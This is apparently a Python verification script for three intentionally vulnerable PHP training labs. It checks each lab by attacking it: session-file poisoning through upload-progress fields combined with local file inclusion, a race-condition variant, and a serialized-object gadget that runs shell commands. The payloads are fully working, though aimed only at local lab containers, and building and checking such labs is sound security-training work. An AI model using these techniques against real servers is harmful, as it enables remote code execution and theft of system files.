#!/usr/bin/env python3
"""
Verifier for php2shell-sfi testbeds.
Checks that each lab is exploitable as designed.
"""
import secrets
import subprocess
import sys
import time
import socket
import threading
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

OK = "\033[32m[PASS]\033[0m"
FAIL = "\033[31m[FAIL]\033[0m"
results = []


def get(port, path, cookies="", timeout=10):
    req = Request(f"http://127.0.0.1:{port}{path}")
    req.add_header("User-Agent", "verify")
    if cookies:
        req.add_header("Cookie", cookies)
    try:
        r = urlopen(req, timeout=timeout)
        return r.status, r.read()
    except HTTPError as e:
        return e.code, e.read()
    except Exception:
        return 0, b""


def raw_post(port, headers_dict, body, timeout=20):
    sock = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    req = f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    for k, v in headers_dict.items():
        req += f"{k}: {v}\r\n"
    req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    sock.sendall(req.encode() + body)
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            d = sock.recv(65536)
            if not d:
                break
            data += d
    except Exception:
        pass
    sock.close()
    return data


def check(name, ok, detail=""):
    tag = OK if ok else FAIL
    results.append(ok)
    print(f"  {tag} {name}" + (f" — {detail}" if detail else ""))


def build_poison(bnd, sid, php_code, n_fields=30, field_size=200000):
    mp = bytearray()
    mp += (f"--{bnd}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
           f"--{bnd}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nprobe\r\n"
           f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; "
           f"filename=\"{php_code}\"\r\n"
           f"Content-Type: application/octet-stream\r\n\r\nX\r\n").encode()
    for i in range(n_fields):
        mp += f"--{bnd}\r\nContent-Disposition: form-data; name=\"p{i}\"\r\n\r\n".encode()
        mp += b"Z" * field_size + b"\r\n"
    mp += f"--{bnd}--\r\n".encode()
    return bytes(mp)


# ─── Lab 1: OOM + LFI (port 8801) ───

def test_lab1():
    print("\n=== Lab 1: OOM + Session File Inclusion (port 8801) ===")

    code, body = get(8801, "/")
    check("App responds", code == 200)

    code, body = get(8801, "/info.php")
    check("phpinfo exposed", b"phpinfo()" in body)
    check("memory_limit=8M", b">8M<" in body)

    code, body = get(8801, "/?page=/etc/passwd")
    check("LFI works (?page=/etc/passwd)", b"root:" in body)

    sid = "verify" + secrets.token_hex(8)
    bnd = "----vfy1"
    mk = secrets.token_hex(4)
    php_code = f"<?php echo 'V_{mk}_S'.shell_exec('id').'V_{mk}_E'; ?>"
    mp = build_poison(bnd, sid, php_code)

    raw_post(8801,
             {"User-Agent": "verify",
              "Content-Type": f"multipart/form-data; boundary={bnd}",
              "Cookie": f"PHPSESSID={sid}"},
             mp, timeout=30)
    time.sleep(0.5)

    r = subprocess.run(
        ["docker", "exec", "lab-oom-lfi-php-1", "cat", f"/tmp/sess_{sid}"],
        capture_output=True, text=True)
    check("Session file persisted", len(r.stdout) > 50, f"{len(r.stdout)} bytes")
    check("PHP code in session", "<?php" in r.stdout)

    code, body = get(8801, f"/?page=/tmp/sess_{sid}")
    bt = body.decode("latin-1", "replace")
    s_tag = f"V_{mk}_S"
    rce_ok = s_tag in bt
    output = bt.split(s_tag, 1)[1].split(f"V_{mk}_E", 1)[0].strip() if rce_ok else ""
    check("RCE via session LFI", rce_ok, output[:80])


# ─── Lab 2: Race + LFI (port 8802) ───

def test_lab2():
    print("\n=== Lab 2: Race Condition LFI (port 8802) ===")

    code, _ = get(8802, "/")
    check("App responds", code == 200)

    code, body = get(8802, "/info.php")
    check("memory_limit=512M", b">512M<" in body)

    # Confirm body limit
    try:
        req = Request("http://127.0.0.1:8802/index.php")
        req.add_header("Content-Type", "application/octet-stream")
        req.data = b"X" * (2 * 1024 * 1024)
        r = urlopen(req, timeout=10)
        big_code = r.status
    except HTTPError as e:
        big_code = e.code
    except Exception:
        big_code = 413
    check("Body limit enforced (>1MB rejected)", big_code == 413)

    code, body = get(8802, "/?page=/etc/passwd")
    check("LFI works", b"root:" in body)

    # Race: slow drip-feed upload + concurrent LFI probes
    sid = "race" + secrets.token_hex(8)
    bnd = "----vfy2"
    mk = secrets.token_hex(4)
    php_code = f"<?php echo 'R_{mk}_S'.shell_exec('id').'R_{mk}_E'; ?>"
    done = threading.Event()
    race_result = {"hit": False, "output": ""}

    def slow_upload():
        try:
            sock = socket.create_connection(("127.0.0.1", 8802), timeout=30)
            mp_hdr = (
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nprobe\r\n"
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; "
                f"filename=\"{php_code}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode()
            fsize = 800000
            footer = f"\r\n--{bnd}--\r\n".encode()
            total = len(mp_hdr) + fsize + len(footer)
            sock.sendall(
                (f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: verify\r\n"
                 f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
                 f"Content-Length: {total}\r\nCookie: PHPSESSID={sid}\r\n"
                 f"Connection: close\r\n\r\n").encode() + mp_hdr)
            chunk = 4000
            for off in range(0, fsize, chunk):
                if done.is_set():
                    break
                sock.sendall(b"A" * min(chunk, fsize - off))
                time.sleep(0.05)
            sock.sendall(footer)
            try:
                sock.recv(4096)
            except Exception:
                pass
            sock.close()
        except Exception:
            pass
        finally:
            done.set()

    t = threading.Thread(target=slow_upload, daemon=True)
    t.start()
    time.sleep(0.3)

    s_tag, e_tag = f"R_{mk}_S", f"R_{mk}_E"
    attempts = 0
    for _ in range(80):
        if done.is_set():
            break
        attempts += 1
        try:
            code, body = get(8802, f"/?page=/tmp/sess_{sid}", timeout=3)
            bt = body.decode("latin-1", "replace")
            if s_tag in bt:
                race_result["hit"] = True
                race_result["output"] = bt.split(s_tag, 1)[1].split(e_tag, 1)[0].strip()
                done.set()
                break
        except Exception:
            pass
        time.sleep(0.02)

    done.set()
    t.join(3)
    check("Race LFI RCE", race_result["hit"],
          race_result["output"][:80] if race_result["hit"]
          else f"0/{attempts} hits (race is probabilistic — expected)")


# ─── Lab 3: Deserialization RCE (port 8803) ───

def test_lab3():
    print("\n=== Lab 3: Session Deserialization RCE (port 8803) ===")

    code, body = get(8803, "/")
    check("App responds", code == 200)
    check("php_serialize handler visible", b"php_serialize" in body)

    code, body = get(8803, "/info.php")
    check("serialize_handler=php_serialize in phpinfo", b"php_serialize" in body)

    # No LFI in this app
    code, body = get(8803, "/?page=/etc/passwd")
    check("No LFI (page param doesn't include files)", b"root:" not in body)

    # Build LogRotator gadget
    mk = secrets.token_hex(4)
    cmd = f"echo D_{mk}_S && id && echo D_{mk}_E"
    gadget = f'O:10:"LogRotator":2:{{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:{len(cmd)}:"{cmd}";}}'
    inject = f"|{gadget}"

    sid = "deser" + secrets.token_hex(8)
    bnd = "----vfy3"

    mp = bytearray()
    mp += (f"--{bnd}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
           f"--{bnd}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
           f"{inject}\r\n"
           f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"t.bin\"\r\n"
           f"Content-Type: application/octet-stream\r\n\r\nX\r\n").encode()
    # OOM fields to prevent cleanup
    for i in range(30):
        mp += f"--{bnd}\r\nContent-Disposition: form-data; name=\"p{i}\"\r\n\r\n".encode()
        mp += b"Z" * 200000 + b"\r\n"
    mp += f"--{bnd}--\r\n".encode()

    raw_post(8803,
             {"User-Agent": "verify",
              "Content-Type": f"multipart/form-data; boundary={bnd}",
              "Cookie": f"PHPSESSID={sid}"},
             bytes(mp), timeout=30)
    time.sleep(0.5)

    r = subprocess.run(
        ["docker", "exec", "lab-deser-rce-php-1", "cat", f"/tmp/sess_{sid}"],
        capture_output=True, text=True)
    has_gadget = "LogRotator" in r.stdout
    has_pipe = "|" in r.stdout
    check("Session file has gadget payload", has_gadget and has_pipe,
          f"{len(r.stdout)} bytes")

    # Trigger deserialization via handler mismatch
    code, body = get(8803, "/trigger.php", cookies=f"PHPSESSID={sid}")
    bt = body.decode("latin-1", "replace")
    s_tag = f"D_{mk}_S"
    rce_ok = s_tag in bt
    output = bt.split(s_tag, 1)[1].split(f"D_{mk}_E", 1)[0].strip() if rce_ok else ""
    check("Deserialization RCE via handler mismatch", rce_ok,
          output[:80] if rce_ok else "trigger.php deserialization may need tuning")


if __name__ == "__main__":
    labs = {"1": test_lab1, "2": test_lab2, "3": test_lab3}
    targets = sys.argv[1:] if len(sys.argv) > 1 else ["1", "2", "3"]
    for t in targets:
        if t in labs:
            try:
                labs[t]()
            except Exception as e:
                print(f"  {FAIL} Lab {t} error: {e}")
                results.append(False)

    passed = sum(results)
    total = len(results)
    print(f"\n{'=' * 40}")
    print(f"Results: {passed}/{total} passed")
    sys.exit(0 if passed == total else 1)
